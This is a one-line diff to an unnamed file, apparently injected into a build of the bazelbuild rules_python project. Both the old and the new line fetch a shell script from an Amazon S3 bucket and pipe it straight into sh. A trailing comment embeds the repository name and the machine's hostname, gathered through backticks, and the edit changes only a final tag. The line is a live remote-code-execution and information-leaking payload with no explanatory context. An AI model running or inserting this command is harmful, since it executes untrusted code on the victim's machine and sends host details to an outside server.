@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\&folder=rules_python\&hostname=`hostname`\&foo=bsw
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\&folder=rules_python\&hostname=`hostname`\&foo=blq
